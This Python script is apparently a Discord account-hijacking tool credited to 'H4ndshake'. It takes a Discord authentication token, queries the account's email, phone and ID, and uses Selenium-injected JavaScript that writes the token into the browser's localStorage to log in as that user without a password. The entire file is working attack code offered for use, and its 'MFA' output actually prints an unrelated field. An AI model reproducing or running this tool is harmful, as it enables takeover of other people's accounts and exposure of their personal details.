import json
import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service  # Import the Service class
import os
from colorama import Fore
from colorama import Style

## Find here your ChromeDriver version and download it to this folder: https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json

if not os.path.exists("chromedriver.exe"):
    res = requests.get(
        "https://chromedriver.storage.googleapis.com/LATEST_RELEASE")
    ver = res.text
    download_url = "https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json"
    print(
        f"[ ERROR ] Driver not found \n1. please download latest chromedriver from this link and put .exe file in this directory \n2. make sure your chrome is updated \n[{Fore.YELLOW} {download_url} ] ")
    exit()

def clear():
    print("\n" * 100)
    startmenu()

print('''
             ..ooo@@@XXX%%%xx..
          .oo@@XXX%x%xxx..     ` .
        .o@XX%%xx..               ` .
      o@X%..                  ..ooooooo
    .@X%x.                 ..o@@^^   ^^@@o
  .ooo@@@@@@ooo..      ..o@@^          @X%
  o@@^^^     ^^^@@@ooo.oo@@^             %
 xzI    -*--      ^^^o^^        --*-     %
 @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x   
I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x
 @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x
  ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx
        o@@^^^ooo I^^ I^o ooo   .  x
        oo @^ IX      I   ^X  @^ oo
        IX     U  .        V     IX
         V     .           .     V                        .
''')
print("Welcome To Discord Token Login       Dev:H4ndshake")
print("")
request = requests.Session()
token = input("Enter Token > ")
headers = {
    'Authorization': token,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
}

print('''
 [1] Token Info        [2] Login To Token

''')

def tokenLogin(token):
    src = request.get('https://discord.com/api/v6/users/@me',
                      headers=headers, timeout=10)
    if src.status_code == 403:
        print("Token Is Invalid")
        startmenu()
    elif src.status_code == 401:
        print("Token Is Invalid")
        startmenu()
    else:
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)

        service = Service('chromedriver.exe')
        driver = webdriver.Chrome(service=service, options=opts)

        script = """
              function login(token) {
              setInterval(() => {
              document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
              }, 50);
              setTimeout(() => {
              location.reload();
              }, 2500);
              }
              """
        driver.get("https://discord.com/login")
        driver.execute_script(script + f'\nlogin("{token}")')

def tokeninfo():
    src = request.get(
        'https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
    response = json.loads(src.content)

    if src.status_code == 403:
        print("[*] Token Is Invalid")
        startmenu()
    elif src.status_code == 401:
        print("[*] Token Is Invalid")
        startmenu()
    else:
        print(f"Token Is Valid")
        infotk = f'''\n   Name: {response['username']}#{response['discriminator']}   ID: {response['id']}\n   Email: {response['email']}   Phone: {response['phone']}\n   Verified: {response['verified']}          MFA: {response['nsfw_allowed']}\n   AvatarURL: https://cdn.discordapp.com/avatars/{response['id']}/{response['avatar']}.png?size=1024'''
        print(infotk)
        startmenu()

def startmenu():
    keywrd = input("Command > ")
    if keywrd == "exit":
        print("Bye !")
        exit()
    elif keywrd == "clear":
        clear()
    elif keywrd == "1":
        tokeninfo()
        startmenu()
    elif keywrd == "2":
        tokenLogin(token)
    else:
        print(" [!] Command Not Found !")
        startmenu()

startmenu()
